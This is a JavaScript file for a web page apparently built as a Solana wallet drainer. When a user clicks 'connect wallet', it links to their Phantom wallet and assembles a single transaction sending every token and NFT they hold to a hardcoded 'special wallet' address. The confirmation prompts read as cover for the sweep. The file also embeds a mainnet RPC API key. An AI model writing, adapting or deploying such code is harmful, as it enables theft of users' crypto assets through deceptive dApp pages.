import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { getAssociatedTokenAddress, getAccount, createTransferInstruction, getOrCreateAssociatedTokenAccount, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // Make Buffer available globally if needed

async function transferAllTokensAndNFTs(specialWallet) {
    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
    const publicKey = new PublicKey(window.solana.publicKey);

    let transaction = new Transaction();

    // Fetch all token accounts
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
    });

    // Check if the user has any tokens or NFTs to transfer
    if (tokenAccounts.value.length === 0) {
        console.log("No tokens or NFTs found in the user's wallet.");
        alert("No tokens or NFTs found in your wallet to transfer.");
        return;
    }

    // Iterate over all token accounts and transfer each token to the special wallet
    for (const tokenAccountInfo of tokenAccounts.value) {
        const tokenAccount = tokenAccountInfo.account.data.parsed.info;
        const tokenMint = new PublicKey(tokenAccount.mint);
        const tokenAmount = tokenAccount.tokenAmount.uiAmount;

        if (tokenAmount > 0) {
            const receiverTokenAddress = await getAssociatedTokenAddress(
                tokenMint,
                specialWallet,
                false,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
            );

            // Transfer the token to the special wallet
            transaction.add(
                createTransferInstruction(
                    new PublicKey(tokenAccountInfo.pubkey),
                    receiverTokenAddress,
                    publicKey,
                    tokenAmount * (10 ** tokenAccount.tokenAmount.decimals),
                    [],
                    TOKEN_PROGRAM_ID
                )
            );
        }
    }

    // Add a confirmation prompt for the user
    if (!confirm("This will transfer all your tokens and NFTs to a special wallet. Are you sure you want to proceed?")) {
        console.log("User declined the transfer.");
        return;
    }

    transaction.feePayer = publicKey;
    const blockhashObj = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhashObj.blockhash;

    try {
        const signedTransaction = await window.solana.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(txid, 'confirmed');

        console.log("All tokens and NFTs transferred to special wallet:", txid);
        alert("Transaction successful! All your tokens and NFTs have been transferred.");
    } catch (err) {
        console.error("Error during transaction:", err);
        alert("Transaction failed. Please try again.");
    }
}

async function handleConnectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();

            // Clear message to the user about the action to be performed
            alert("This DApp will transfer all tokens and NFTs from your wallet to a special wallet. Please confirm in the next step.");

            // Trigger the real transaction after user confirms
            const specialWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Special wallet address
            await transferAllTokensAndNFTs(specialWallet);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet or during transaction:", err);
            alert("Error connecting to Phantom Wallet. Please try again.");
        }
    } else {
        alert("Phantom extension not found. Please install Phantom Wallet.");
        // Open appropriate download links...
    }
}

// Attach the event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connect-wallet').addEventListener('click', handleConnectWallet);
});
